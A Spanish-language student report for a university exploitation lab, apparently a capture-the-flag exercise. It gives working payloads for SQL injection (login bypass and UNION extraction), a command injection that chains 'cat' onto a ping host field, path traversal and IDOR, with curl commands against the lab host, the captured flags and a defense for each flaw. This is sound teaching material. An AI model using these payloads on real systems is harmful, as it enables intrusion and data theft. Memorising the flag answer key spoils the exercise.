# Informe — Laboratorio 07 · Explotación

**Grupo:** 12  
**Integrantes:**
- Gerbaudo, Mateo — @gerbaudo19
- Mariatti, Matias — @matiasmariatticasc
- Colque Condo, Luis Alvaro — @ColqueAlvaro
- Rodriguez, Gonzalo — @Gonza149  
**Fecha:** 30 de Octubre de 2026

---

## 0. Declaración de uso de IA

En cumplimiento con el régimen de la cátedra y las pautas de `CONTRIBUTING.md`:

- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini 3.8 Flash).
- **Alcance de la asistencia:** Asistencia en la inicialización de la entrega, estructuración del informe técnico, configuración del entorno de documentación para el grupo y registro de captura de banderas del CTF (@gerbaudo19); asistencia en la documentación analítica de los vectores explotados, consultas y comandos resultantes, evaluación de impacto, defensas técnicas en la Sección 2 (Tabla de explotación R1-R5) y estructuración de la Sección 4 (Bitácora de comandos) (@matiasmariatticasc).
- **Partes originadas o modificadas:** Inicialización de `INTEGRANTES.md`, Sección 0 (Declaración de uso de IA) y Sección 1 (Flags capturadas de R1 a R5) por @gerbaudo19; Sección 2 (Tabla de explotación) y Sección 4 (Bitácora de comandos) por @matiasmariatticasc; Sección 3 (Preguntas de análisis P1-P5 a completar por @ColqueAlvaro y @Gonza149).
- **Verificación humana:** Se verificaron las credenciales y roles de los integrantes del Grupo 12, se contrastaron los identificadores y hashes de los retos R1 a R5 contra `retos.manifest`. Para la Sección 2 y 4, se contrastó cada payload contra el código fuente del backend (`server.py`), validando que la sintaxis de las consultas resultantes en SQLite, comandos en bash y resoluciones de ruta canónica reflejen con precisión la ejecución del servidor vulnerable, así como las recomendaciones de mitigación según OWASP (ASVS y Top 10:2021).

---

## 1. Flags capturadas

Salida de `./ctf status 07`:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ✓  R3     Inyeccion de comandos (RCE)
   ✓  R4     Path traversal / LFI
   ✓  R5     IDOR - control de acceso roto

  ██████████████████████████████  5/5 (100%)

  ✓ ¡Lab 07 COMPLETO! Ponete las pilas con la próxima unidad.
```

---

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| **SQLi auth (R1)** | `admin' --` *(en campo user)* | `SELECT user, rol FROM users WHERE user='admin' --' AND pass='...'` | **Bypass de autenticación (Crítico):** Acceso con rol de administrador sin conocer ni validar contraseña, desbloqueando el panel de administración y obteniendo la bandera de autenticación (`FLAG{sqli_auth_bypass}`). | **Consultas preparadas (Prepared Statements):** Parametrizar la consulta con placeholders (`WHERE user=? AND pass=?`) y almacenar las contraseñas utilizando funciones lentas de hash con salting (PBKDF2/Argon2/bcrypt) en lugar de comparaciones en texto claro. |
| **SQLi UNION (R2)** | `' UNION SELECT clave, valor FROM secrets --` *(en parámetro q)* | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%' UNION SELECT clave, valor FROM secrets --%'` | **Exfiltración de datos no autorizada (Alto):** Anexión de resultados de tablas internas arbitrarias (`secrets`) en la respuesta pública del catálogo, extrayendo claves secretas y la bandera (`FLAG{sqli_union_dump}`). | **Parametrización estricta de consultas LIKE:** Utilizar `WHERE nombre LIKE ?` pasando el término con comodines (`%termino%`) como parámetro enlazado; aplicar principio de mínimo privilegio en la base de datos limitando tablas accesibles para el usuario de la app. |
| **Command injection (R3)** | `127.0.0.1; cat /app/flags/cmdi.txt` *(en parámetro host)* | `ping -c1 127.0.0.1; cat /app/flags/cmdi.txt 2>&1` *(vía os.popen)* | **Ejecución Remota de Código - RCE (Crítico):** Control arbitrario de la consola del sistema operativo bajo el usuario del proceso web (`app`), permitiendo lectura de archivos confidenciales del servidor (`FLAG{command_injection_rce}`) y pivoteo hacia la red interna. | **Evitar ejecución mediante shell del SO:** Usar librerías nativas de red (ej. sockets de Python) para verificar conectividad en lugar de llamar a `ping` con `os.popen()`. Si es mandatorio invocar binarios, utilizar `subprocess.run(["ping", "-c1", host], shell=False)` con validación previa de whitelist estricta (`^[a-zA-Z0-9.-]+$`). |
| **Path traversal (R4)** | `../flags/lfi.txt` *(en parámetro archivo)* | `open("/app/public/../flags/lfi.txt")` $\rightarrow$ resuelve canónicamente a `/app/flags/lfi.txt` | **Lectura arbitraria de archivos locales - LFI (Alto):** Evasión del directorio raíz público (`/app/public/`), logrando acceder y leer archivos sensibles del sistema operativo y flags restringidas (`FLAG{path_traversal_lfi}`). | **Validación y canonicidad de rutas:** Resolver la ruta absoluta con `os.path.realpath()` y validar que comience estrictamente con el prefijo permitido (`os.path.commonpath([base_dir, target]) == base_dir`); o aislar la descarga a nombres seguros con `os.path.basename()` y rechazar secuencias `../`. |
| **IDOR (R5)** | `id=1` *(en parámetro de consulta)* | `SELECT id, user, rol, nota_privada FROM users WHERE id=1` | **Acceso indebido a objetos y datos ajenos (Medio/Alto):** Ruptura del control de acceso a nivel de objeto; cualquier usuario puede consultar identificadores numéricos ajenos y acceder a la nota privada del administrador que contiene `FLAG{idor_broken_access}`. | **Control de acceso en el servidor:** No confiar en identificadores provistos por el cliente en endpoints personales; asociar la consulta al identificador del usuario autenticado en la sesión (`WHERE id = current_user.id`) o implementar políticas de autorización en backend verificando pertenencia antes de servir el recurso. |

---

## 3. Preguntas de análisis

**P1 — por qué funciona el bypass (con la query).**

**P2 — por qué el UNION necesita igual número de columnas.**

**P3 — qué sigue después del RCE.**

**P4 — por qué parametrizar mata la SQLi.**

**P5 — dónde va el control de acceso (IDOR).**

---

## 4. Bitácora de comandos

Comandos ejecutados desde la consola del atacante (`make shell`) contra el entorno vulnerable `http://phantomcorp`:

```bash
# ==========================================
# R1: SQLi - Bypass de Autenticación
# ==========================================
# Inyección en el parámetro 'user' comentando la validación del password con '--'
curl -s -X POST http://phantomcorp/login \
  --data-urlencode "user=admin' --" \
  --data-urlencode "pass=cualquiera"

# Enviar flag al evaluador CTF
./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'

# ==========================================
# R2: SQLi - Extracción con UNION
# ==========================================
# Determinación de columnas y extracción de la tabla 'secrets'
curl -s -G http://phantomcorp/buscar \
  --data-urlencode "q=' UNION SELECT clave, valor FROM secrets --"

# Enviar flag al evaluador CTF
./ctf submit 07 R2 'FLAG{sqli_union_dump}'

# ==========================================
# R3: Command Injection (RCE)
# ==========================================
# Encadenamiento de comandos en el parámetro host mediante ';'
curl -s -G http://phantomcorp/herramientas/ping \
  --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"

# Enviar flag al evaluador CTF
./ctf submit 07 R3 'FLAG{command_injection_rce}'

# ==========================================
# R4: Path Traversal (LFI)
# ==========================================
# Escape del directorio '/app/public' mediante '../'
curl -s -G http://phantomcorp/descargar \
  --data-urlencode "archivo=../flags/lfi.txt"

# Enviar flag al evaluador CTF
./ctf submit 07 R4 'FLAG{path_traversal_lfi}'

# ==========================================
# R5: IDOR - Control de Acceso Roto
# ==========================================
# Consulta del objeto con ID correspondiente al admin (id=1)
curl -s -G http://phantomcorp/perfil \
  --data-urlencode "id=1" | jq .

# Enviar flag al evaluador CTF
./ctf submit 07 R5 'FLAG{idor_broken_access}'

# ==========================================
# Verificación de estado del laboratorio
# ==========================================
./ctf status 07
```
